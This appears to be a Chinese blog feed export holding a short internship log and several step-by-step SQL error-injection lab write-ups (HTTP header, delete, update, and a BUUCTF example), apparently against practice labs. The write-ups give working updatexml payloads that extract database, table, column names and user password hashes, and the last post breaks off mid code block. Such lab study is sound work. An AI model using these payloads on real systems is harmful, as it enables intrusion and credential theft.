title="8月9日："></a>8月9日：</h6><ul><li><p>&emsp;&emsp;行业数据安全相关法律法规(教育行业方向)整理出了excel形式的业务依据</p></li><li><p>&emsp;&emsp;整理教育行业word形式的相关法律法规全文</p></li></ul><h6 id="8月10："><a href="#8月10：" class="headerlink" title="8月10："></a>8月10：</h6><ul><li>&emsp;&emsp;查找后续相关讲座与研讨会</li><li>&emsp;&emsp;整理医疗行业法律法规规定一些角色的责任义务</li><li>&emsp;&emsp;《数据安全技术前沿研究笔记》第三章阅读</li></ul><h6 id="8月11："><a href="#8月11：" class="headerlink" title="8月11："></a>8月11：</h6><ul><li>&emsp;&emsp;差分隐私学习和理解</li><li>&emsp;&emsp;《数据安全技术前沿研究笔记》第三章总结</li></ul><h6 id="8月12："><a href="#8月12：" class="headerlink" title="8月12："></a>8月12：</h6><ul><li>&emsp;&emsp;整理研讨会资料——《数据安全与数据要素治理研讨会》</li><li>&emsp;&emsp;自我总结研讨会心得</li></ul><h6 id="8月13日-8月14日："><a href="#8月13日-8月14日：" class="headerlink" title="8月13日-8月14日："></a>8月13日-8月14日：</h6><ul><li>&emsp;&emsp;周末</li></ul><h6 id="8月15日："><a href="#8月15日：" class="headerlink" title="8月15日："></a>8月15日：</h6><ul><li>&emsp;&emsp;整理研讨会资料——《网络空间安全高峰论坛》</li><li>&emsp;&emsp;自我总结研讨会心得（感觉罗里吧嗦讲了一堆）</li></ul><h6 id="8月1日："><a href="#8月1日：" class="headerlink" title="8月1日："></a>8月1日：</h6><ul><li>&emsp;&emsp;整理研讨会资料（做得不好，返工了捏）</li><li>&emsp;&emsp;寻找某行业网络安全大赛（看了是真想打，可惜我不配。呜呜呜）</li></ul>]]></content>
    
    
    <categories>
      
      <category>五所实习之数据安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>报错注入——HTTP头型</title>
    <link href="/2022/08/15/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94HTTP%E5%A4%B4%E5%9E%8B/"/>
    <url>/2022/08/15/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94HTTP%E5%A4%B4%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="报错注入——HTTP头型"><a href="#报错注入——HTTP头型" class="headerlink" title="报错注入——HTTP头型"></a>报错注入——HTTP头型</h1><h4 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h4><p>&emsp;&emsp;由于后台开发人员有时为了能够验证客户端登录的相关信息（比如网页的Cookie值验证）或者通过HTTP头用相关函数（SERVER）获取客户端的一些信息（比如QQ的登录定位等）</p><p>&emsp;&emsp;由于HTTP所使用的函数语句存在变量传送至数据库当中并使用了SQL语句进行处理，从而导致了SQL注入有机可乘</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#$_SERVER详解</span><br><span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_ACCEPT_LANGUAGE&#x27;</span>]       <span class="hljs-comment">//浏览器语言 </span><br><span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]               <span class="hljs-comment">//当前用户 IP</span><br><span class="hljs-comment">#其余的相关内容可以参考网站：https://www.cainiaoxueyuan.com/bc/9910.html</span><br></code></pre></td></tr></table></figure><p>&emsp;&emsp;</p><h4 id="1-查看界面"><a href="#1-查看界面" class="headerlink" title="1.查看界面"></a>1.查看界面</h4><p>&emsp;&emsp;登录界面与提示：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94HTTP%E5%A4%B4%E5%9E%8B/1.png" style="zoom: 80%;" /></center><p>&emsp;&emsp;登录出现错误画面：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94HTTP%E5%A4%B4%E5%9E%8B/2.png" style="zoom: 80%;" /></center><p>&emsp;</p><h4 id="2-正确登录"><a href="#2-正确登录" class="headerlink" title="2.正确登录"></a>2.正确登录</h4><p>&emsp;&emsp;查看提示显示，给了我们登录的账号和密码，登入：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94HTTP%E5%A4%B4%E5%9E%8B/3.jpg" style="zoom: 80%;" /></center><p>&emsp;</p><h4 id="3-报文分析3"><a href="#3-报文分析3" class="headerlink" title="3.报文分析3"></a>3.报文分析3</h4><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94HTTP%E5%A4%B4%E5%9E%8B/4.png" style="zoom: 80%;" /></center><p>&emsp;&emsp;在上面的内容中，我们可以看见，当登录成功后，反馈出了我们的ip地址、使用浏览器类型和相关的端口等信息，这明显涉及到了之前在请求注入类型中的http头类型，在反馈的浏览器类型中加入单引号查看是否存在注入点：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94HTTP%E5%A4%B4%E5%9E%8B/5.jpg" style="zoom: 80%;" /></center><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Chrome/<span class="hljs-number">99.0</span>.<span class="hljs-number">4844.51</span> Safari/<span class="hljs-number">537.36</span> <span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>&emsp;&emsp;通过反馈的内容提示可以看见（have an error in your SQL syntax），这说明存在SQL注入的漏洞，由于没有回显位置，所以尝试采用报错注入。</p><h4 id="4-使用updatexml函数获取数据库名"><a href="#4-使用updatexml函数获取数据库名" class="headerlink" title="4.使用updatexml函数获取数据库名"></a>4.使用updatexml函数获取数据库名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; or (updatexml(1,concat(0x7e,database(),0x7e),1))or&#x27;</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94HTTP%E5%A4%B4%E5%9E%8B/6.jpg" style="zoom: 80%;" /></center><p>&emsp;&emsp;注入方式依旧是updatexml老方法</p><p>&emsp;&emsp;</p><h4 id="5-获取数据库表名"><a href="#5-获取数据库表名" class="headerlink" title="5.获取数据库表名"></a>5.获取数据库表名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;or(updatexml(0x7e,concat(0x7e,(select(group_concat(table_name)) from (information_schema.tables)where(table_schema)like(database())),0x7e),0x7e))or&#x27;</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94HTTP%E5%A4%B4%E5%9E%8B/7.jpg" style="zoom: 80%;" /></center><p>&emsp;&emsp;经典不够长，继续使用substr，其实limit也能用（但是我懒得重新写语句了）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; or (updatexml(1,concat(0x7e,substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),32,31),0x7e),1)) or&#x27;</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94HTTP%E5%A4%B4%E5%9E%8B/8.jpg" style="zoom: 80%;" /></center><p>&emsp;</p><h4 id="6-获取表"><a href="#6-获取表" class="headerlink" title="6.获取表"></a>6.获取表</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;  or (updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;</span>users<span class="hljs-string">&#x27;)),0x7e),1))or&#x27;</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94HTTP%E5%A4%B4%E5%9E%8B/9.jpg" style="zoom: 80%;" /></center><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; or (updatexml(1,concat(0x7e,substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;</span>users<span class="hljs-string">&#x27;)),32,32),0x7e),1))or&#x27;</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94HTTP%E5%A4%B4%E5%9E%8B/10.jpg" style="zoom: 80%;" /></center><p>&emsp;</p><h4 id="7-获取表中的内容"><a href="#7-获取表中的内容" class="headerlink" title="7.获取表中的内容"></a>7.获取表中的内容</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; or (updatexml(1,concat(0x7e,(select(group_concat(username))from(users)),0x7e),1))or&#x27;</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94HTTP%E5%A4%B4%E5%9E%8B/11.jpg" style="zoom: 80%;" /></center><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; or (updatexml(1,concat(0x7e,(select(group_concat(password))from(users)),0x7e),1))or&#x27;</span><br></code></pre></td></tr></table></figure><p>&emsp;</p><h4 id="8-解码"><a href="#8-解码" class="headerlink" title="8.解码"></a>8.解码</h4><p>&emsp;&emsp;“MD5的码，请阅读SQL——数字型”</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94update%E5%9E%8B/1.png" style="zoom:150%;" /></center><p>&emsp;</p><h4 id="9-总结"><a href="#9-总结" class="headerlink" title="9.总结"></a>9.总结</h4><p>&emsp;&emsp;对于报错注入的三种类型演示就结束 了，接下来将是布尔类型和时间类型的注入了，在报错注入的学习中，还是有疑问的，比如在HTTP头中，为什么注入语句在内容前面能够注入成功，在内容的后面反而提示数据类型错误，还没想明白，很多博客上只说能注入就没了，说和前面的报错注入一样，我觉得是肤浅的,对于不同的类型而言，肯定有新的东西和应该注意的地方</p><p>&emsp;&emsp;以及应该有注意到，在前面的update类型中，用or的注入不成功，用and却成功了，这在逻辑上我无法理解，但是总归是试出来了，看来还有很长的路要去走呀！</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>报错注入——delete型</title>
    <link href="/2022/08/14/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94delete%E5%9E%8B/"/>
    <url>/2022/08/14/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94delete%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="报错注入——delete型"><a href="#报错注入——delete型" class="headerlink" title="报错注入——delete型"></a>报错注入——delete型</h1><h4 id="1-查看界面"><a href="#1-查看界面" class="headerlink" title="1.查看界面"></a>1.查看界面</h4><p>&emsp;&emsp;登录界面:</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94delete%E5%9E%8B/1.jpg" style="zoom:67%;" /></center><p>&emsp;&emsp;很明显，并没有反馈的东西，我们尝试点击留言内容</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94delete%E5%9E%8B/2.jpg" style="zoom:67%;" /></center><p>&emsp;&emsp;当我们输入内容时，会直接传送到留言板中，也没有显示位置，但是留意有删除选项，查看是否为注入点</p><p>&emsp;</p><h4 id="2-点击删除"><a href="#2-点击删除" class="headerlink" title="2.点击删除"></a>2.点击删除</h4><p>&emsp;&emsp;删除后界面：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94delete%E5%9E%8B/3.jpg" style="zoom:67%;" /></center><p>&emsp;&emsp;可以看见“11”的内容被删除了，明显这就是在通过删除修改数据库内容，这是一个接入点，抓取报文进行尝试</p><p>&emsp;</p><h4 id="3-分析报文"><a href="#3-分析报文" class="headerlink" title="3.分析报文"></a>3.分析报文</h4><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94delete%E5%9E%8B/4.jpg" style="zoom:67%;" /></center><p>&emsp;&emsp;在报文中存在传送id值，这明显是数字类型，所以后续不用加入单引号进行注入，首先尝试了一下联合注入，但由于没有回显位，所以是肯定不行的。（需要注意，这里是GET传送，所以要使用URL的编码格式！！！）</p><p>&emsp;</p><h4 id="4-使用updatexml函数获取数据库名"><a href="#4-使用updatexml函数获取数据库名" class="headerlink" title="4.使用updatexml函数获取数据库名"></a>4.使用updatexml函数获取数据库名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">or</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,database(),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94delete%E5%9E%8B/5.jpg" style="zoom:60%;" /></center><p>&emsp;</p><h4 id="5-获取数据库表名"><a href="#5-获取数据库表名" class="headerlink" title="5.获取数据库表名"></a>5.获取数据库表名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">or</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(table_name))<span class="hljs-keyword">from</span>(information_schema.tables)<span class="hljs-keyword">where</span>(table_schema)<span class="hljs-keyword">like</span>(database())),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94delete%E5%9E%8B/6.jpg" style="zoom:60%;" /></center><p>&emsp;&emsp;有缺失，说明长度不够长，使用substr函数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">or</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,substr((<span class="hljs-keyword">select</span>(group_concat(table_name))<span class="hljs-keyword">from</span>(information_schema.tables)<span class="hljs-keyword">where</span>(table_schema)<span class="hljs-keyword">like</span>(database())),<span class="hljs-number">32</span>,<span class="hljs-number">31</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)) <br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94delete%E5%9E%8B/7.jpg" style="zoom:60%;" /></center><p>&emsp;</p><h4 id="6-获取表"><a href="#6-获取表" class="headerlink" title="6.获取表"></a>6.获取表</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">or</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(column_name))<span class="hljs-keyword">from</span>(information_schema.columns)<span class="hljs-keyword">where</span>(table_name)<span class="hljs-keyword">like</span>(<span class="hljs-string">&#x27;users&#x27;</span>)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94delete%E5%9E%8B/8.jpg" style="zoom:60%;" /></center><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">or</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,substr((<span class="hljs-keyword">select</span>(group_concat(column_name))<span class="hljs-keyword">from</span>(information_schema.columns)<span class="hljs-keyword">where</span>(table_name)<span class="hljs-keyword">like</span>(<span class="hljs-string">&#x27;users&#x27;</span>)),<span class="hljs-number">32</span>,<span class="hljs-number">32</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94delete%E5%9E%8B/9.jpg" style="zoom:60%;" /></center><p>&emsp;</p><h4 id="7-获取表中的内容"><a href="#7-获取表中的内容" class="headerlink" title="7.获取表中的内容"></a>7.获取表中的内容</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">or</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(username))<span class="hljs-keyword">from</span>(users)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94delete%E5%9E%8B/10.jpg" style="zoom:60%;" /></center><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">or</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(password))<span class="hljs-keyword">from</span>(users)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94delete%E5%9E%8B/11.jpg" style="zoom:60%;" /></center><p>&emsp;</p><h4 id="8-解码"><a href="#8-解码" class="headerlink" title="8.解码"></a>8.解码</h4><p>&emsp;&emsp;“MD5的码，请阅读SQL——数字型”</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94update%E5%9E%8B/1.png" style="zoom:150%;" /></center>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>报错注入——update型</title>
    <link href="/2022/08/13/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94update%E5%9E%8B/"/>
    <url>/2022/08/13/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94update%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="报错注入——update型"><a href="#报错注入——update型" class="headerlink" title="报错注入——update型"></a>报错注入——update型</h1><h4 id="1-查看界面"><a href="#1-查看界面" class="headerlink" title="1.查看界面"></a>1.查看界面</h4><p>&emsp;&emsp;登录界面:</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94update%E5%9E%8B/1.jpg" style="zoom:67%;" /></center><p>&emsp;&emsp;尝试输入内容查看是否有有用的反馈：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94update%E5%9E%8B/2.jpg" style="zoom:67%;" /></center><p>&emsp;&emsp;很明显，并没有反馈的东西，我们尝试点击注册内容</p><p>&emsp;</p><h4 id="2-点击注册"><a href="#2-点击注册" class="headerlink" title="2.点击注册"></a>2.点击注册</h4><p>&emsp;&emsp;注册界面：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94update%E5%9E%8B/3.jpg" style="zoom:60%;" /></center><p>&emsp;&emsp;明显这就是update更改数据库内容的注册语句，Mysql的update的语句形式如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">update</span> users <span class="hljs-keyword">set</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;liaoyue&#x27;</span> <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span>$id;<br></code></pre></td></tr></table></figure><p>&emsp;&emsp;对于update函数而言，注入的方式是盲注的形式，可以是布尔、时间或者报错注入，下面采用的是报错注入的方式，前两种注入方式后面会讲到。</p><p>&emsp;</p><h4 id="3-分析报文"><a href="#3-分析报文" class="headerlink" title="3.分析报文"></a>3.分析报文</h4><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94update%E5%9E%8B/4.jpg" style="zoom:67%;" /></center>&emsp;&emsp;在username的值处添加单引号，查看情况:<center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94update%E5%9E%8B/5.jpg" style="zoom:60%;" /></center><p>&emsp;&emsp;可以看见在最后是以POST的形式传输注册的内容进行数据库的修改，并且存在mysql报错的反馈，这里是个注入点，开始尝试注入。</p><p>&emsp;</p><h4 id="4-使用updatexml函数获取数据库名"><a href="#4-使用updatexml函数获取数据库名" class="headerlink" title="4.使用updatexml函数获取数据库名"></a>4.使用updatexml函数获取数据库名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27; or (updatexml(1,concat(0x7e,database(),0x7e),1))or&#x27;</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94update%E5%9E%8B/6.jpg" style="zoom:60%;" /></center><p>&emsp;&emsp;这里为什么结尾不是#了呢，这是因为这个上传后续还有其他的东西，如果直接用#注释掉就无法完成闭合（个人理解），所以要用or’进行闭合，注入完一看，是error的内容中出现了pikaqiu，成功的将数据库名输出了</p><p>&emsp;</p><h4 id="5-获取数据库表名"><a href="#5-获取数据库表名" class="headerlink" title="5.获取数据库表名"></a>5.获取数据库表名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))or&#x27;</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94update%E5%9E%8B/7.jpg" style="zoom:60%;" /></center><p>&emsp;&emsp;有缺失，说明长度不够长，使用substr函数，其中：</p><ul><li>substr(string ,1,3) ：取string左边第1位置起，3字长的字符串</li><li>substr(string, -1,3)：取string右边第1位置起，3字长的字符串</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (updatexml(1,concat(0x7e,substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),32,31),0x7e),1)) or&#x27;</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94update%E5%9E%8B/9.jpg" style="zoom:60%;" /></center><p>&emsp;&emsp;将两次反馈拼接起来就是所有的数据库表名了</p><p>&emsp;</p><h4 id="6-获取表"><a href="#6-获取表" class="headerlink" title="6.获取表"></a>6.获取表</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27; and (updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;</span>users<span class="hljs-string">&#x27;)),0x7e),1))or&#x27;</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94update%E5%9E%8B/8.jpg" style="zoom:60%;" /></center><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27; and (updatexml(1,concat(0x7e,substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;</span>users<span class="hljs-string">&#x27;)),32,32),0x7e),1))or&#x27;</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94update%E5%9E%8B/10.jpg" style="zoom:60%;" /></center><p>&emsp;&emsp;通过注入，我们获取到了用户名和密码的列表，接下来就是获取其中的信息了。</p><p>&emsp;</p><h4 id="7-获取表中的内容"><a href="#7-获取表中的内容" class="headerlink" title="7.获取表中的内容"></a>7.获取表中的内容</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27; and (updatexml(1,concat(0x7e,(select(group_concat(username))from(users)),0x7e),1))or&#x27;</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94update%E5%9E%8B/11.jpg" style="zoom:60%;" /></center><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27; and (updatexml(1,concat(0x7e,(select(group_concat(password))from(users)),0x7e),1))or&#x27;</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94update%E5%9E%8B/12.jpg" style="zoom:60%;" /></center><p>&emsp;&emsp;内容显示不全就继续使用substr函数进行补全</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27;  and (updatexml(1,concat(0x7e,substr((select(group_concat(password))from(users)),32,32),0x7e),1))or&#x27;</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94update%E5%9E%8B/13.jpg" style="zoom:60%;" /></center><p>&emsp;</p><h4 id="8-解码"><a href="#8-解码" class="headerlink" title="8.解码"></a>8.解码</h4><p>&emsp;&emsp;“MD5的码，请阅读SQL——数字型”</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94update%E5%9E%8B/1.png" style="zoom:150%;" /></center>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入——报错注入</title>
    <link href="/2022/08/12/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/08/12/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL注入——报错注入"><a href="#SQL注入——报错注入" class="headerlink" title="SQL注入——报错注入"></a>SQL注入——报错注入</h1><p>0.前言</p><p>&emsp;&emsp;报错注入作为可回显注入的另外一种，当联合注入无法使用时，我们可以考虑使用报错注入。它是通过特殊函数错误使用并使其输出错误结果来获取信息的。通俗地讲，是利用了相关函数改变输出错误结果的情况下输出数据库的相关信息。</p><p>&emsp;&emsp;通过上述的话，也就能够知道，报错注入的前提是页面需要出现登录错误的信息。二针对报错函数的不同，也就有这多种多样的注入方式，所以当我们使用某种函数进行报错注入的时候，我们就需要去了解这个函数的构造。话不多说，直接举个”栗子“</p><p>&emsp;&emsp;对于UpdateXML()、ExtractValue()函数而言，参数xpath_expr路径语法错误时，就会反馈错误，将xpath_expr中内容当作sql语句执行后结果和报错结果一同返回。<br>&emsp;&emsp;对于floor()函数而言，则需要count()、rand()、group by，三者缺一不可。floor(rand(0)2)每次执行结果是基本固定的011011…形式。所以在使用group by floor(rand(0)2)创建虚拟表的过程中，会向虚拟表中插入数据的同时，主键的计算产生相同的结果，插入报错。</p><p>&emsp;（下面将以BUUCTF中的HardSQL1为例）</p><p>&emsp;</p><h4 id="1-初始界面"><a href="#1-初始界面" class="headerlink" title="1.初始界面"></a>1.初始界面</h4><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/1.png" style="zoom: 50%;" /></center><p>&emsp;&emsp;可以看见，拥有用户名和密码两个输入口，我们可以在这两个注入点做文章。</p><p>&emsp;</p><h4 id="2-尝试or的注入"><a href="#2-尝试or的注入" class="headerlink" title="2.尝试or的注入"></a>2.尝试or的注入</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;or 1=&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/2.png" style="zoom: 50%;" /></center><p>&emsp;&emsp;看到反馈了，说明注入是失败了，这说明我们是没办法使用联合注入了。但是有回显，我们此时想到了报错注入</p><p>&emsp;</p><h4 id="3-使用updatexml函数获取数据库名"><a href="#3-使用updatexml函数获取数据库名" class="headerlink" title="3.使用updatexml函数获取数据库名"></a>3.使用updatexml函数获取数据库名</h4><p>&emsp;&emsp;首先了解updatexml函数的构造</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 